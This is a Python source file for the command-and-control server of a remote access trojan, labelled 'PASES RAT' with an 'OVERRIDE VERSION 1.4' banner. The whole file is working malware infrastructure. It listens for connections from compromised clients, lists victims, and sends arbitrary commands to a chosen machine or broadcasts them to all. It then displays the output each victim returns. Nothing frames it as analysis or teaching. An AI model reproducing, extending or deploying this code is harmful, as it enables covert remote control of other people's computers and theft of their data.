import socket
import threading
from colorama import Fore, init
import ctypes
import os
import struct

init(autoreset=True)
clients = {}

def logo():
    print(rf"""{Fore.CYAN}
  /$$$$$$  /$$    /$$ /$$$$$$$$ /$$$$$$$  /$$$$$$$  /$$$$$$ /$$$$$$$  /$$$$$$$$
 /$$__  $$| $$   | $$| $$_____/| $$__  $$| $$__  $$|_  $$_/| $$__  $$| $$_____/
| $$  \ $$| $$   | $$| $$      | $$  \ $$| $$  \ $$  | $$  | $$  \ $$| $$      
| $$  | $$|  $$ / $$/| $$$$$   | $$$$$$$/| $$$$$$$/  | $$  | $$  | $$| $$$$$   
| $$  | $$ \  $$ $$/ | $$__/   | $$__  $$| $$__  $$  | $$  | $$  | $$| $$__/   
| $$  | $$  \  $$$/  | $$      | $$  \ $$| $$  \ $$  | $$  | $$  | $$| $$      
|  $$$$$$/   \  $/   | $$$$$$$$| $$  | $$| $$  | $$ /$$$$$$| $$$$$$$/| $$$$$$$$
 \______/     \_/    |________/|__/  |__/|__/  |__/|______/|_______/ |________/

 __   __   ______     ______     ______     __     ______     __   __    
/\ \ / /  /\  ___\   /\  == \   /\  ___\   /\ \   /\  __ \   /\ "-.\ \   
\ \ \'/   \ \  __\   \ \  __<   \ \___  \  \ \ \  \ \ \/\ \  \ \ \-.  \  
 \ \__|    \ \_____\  \ \_\ \_\  \/\_____\  \ \_\  \ \_____\  \ \_\\"\_\ 
  \/_/      \/_____/   \/_/ /_/   \/_____/   \/_/   \/_____/   \/_/ \/_/ 1.4
                                                                                                 
""")
    print(f"{Fore.CYAN}\n    [PASES RAT SERVER RATIFIED PROTOCOL]\n{Fore.RESET}")

def recv_msg(client_socket):
    """Helper function to cleanly reconstruct massive incoming buffer streams."""
    try:
        # Read the 4-byte size header
        header = client_socket.recv(4)
        if not header or len(header) < 4:
            return None
        msg_len = struct.unpack('>I', header)[0]
        
        # Keep downloading chunks until the complete packet is read
        chunks = []
        bytes_received = 0
        while bytes_received < msg_len:
            chunk = client_socket.recv(min(msg_len - bytes_received, 4096))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_received += len(chunk)
            
        return b''.join(chunks).decode('utf-8', errors='ignore')
    except Exception:
        return None

def handle_client(client_socket, addr):
    clients[addr] = client_socket
    ctypes.windll.kernel32.SetConsoleTitleW(f"PASES Connected: {len(clients)}")
    
    while True:
        # FIXED: Server now dynamically waits for the full size of data payload
        response = recv_msg(client_socket)
        if response is None:
            break
        print(f"\n{Fore.GREEN}[{addr[0]}] Output:{Fore.RESET}\n{response}\nPress Enter to refresh command menu...")
        
    print(f"\n{Fore.RED}[!] Client {addr[0]} disconnected.{Fore.RESET}")
    client_socket.close()
    if addr in clients:
        del clients[addr]
    ctypes.windll.kernel32.SetConsoleTitleW(f"PASES Connected: {len(clients)}")

def accept_clients(server):
    while True:
        try:
            client_socket, addr = server.accept()
            threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
        except Exception:
            break

def start_server(host="0.0.0.0", port=5555):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    
    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
    
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        logo()
        print(f"{Fore.GREEN}Listening on {host}:{port}...{Fore.RESET}\n")
        
        if not clients:
            print(f"{Fore.YELLOW}Waiting for client responses...{Fore.RESET}")
            input(f"\n[Menu] Press Enter to refresh client list...")
            continue

        print("=== Connected Clients ===")
        client_list = list(clients.keys())
        for idx, addr in enumerate(client_list, start=1):
            print(f"{Fore.CYAN}{idx}.{Fore.RESET} {addr[0]}:{addr[1]}")
        print(f"{Fore.CYAN}B.{Fore.RESET} Broadcast to ALL clients")
        print(f"{Fore.CYAN}R.{Fore.RESET} Refresh Connection List")
        
        choice = input(f"\nSelect target options (1-{len(client_list)} / B / R): ").strip()
        
        if choice.lower() == 'r' or not choice:
            continue
            
        if choice.lower() == 'b':
            command = input("Enter command to broadcast to ALL clients: ")
            if command:
                for client_socket in list(clients.values()):
                    try: client_socket.send(command.encode('utf-8'))
                    except Exception: pass
            continue

        try:
            idx_choice = int(choice) - 1
            if 0 <= idx_choice < len(client_list):
                target_addr = client_list[idx_choice]
                command = input(f"Enter command for {target_addr[0]}: ")
                if command:
                    clients[target_addr].send(command.encode('utf-8'))
                    input("Sent! Press Enter to refresh command menu...")
            else:
                input("Invalid selection range. Press Enter...")
        except ValueError:
            input("Invalid syntax. Press Enter...")

if __name__ == "__main__":
    start_server()
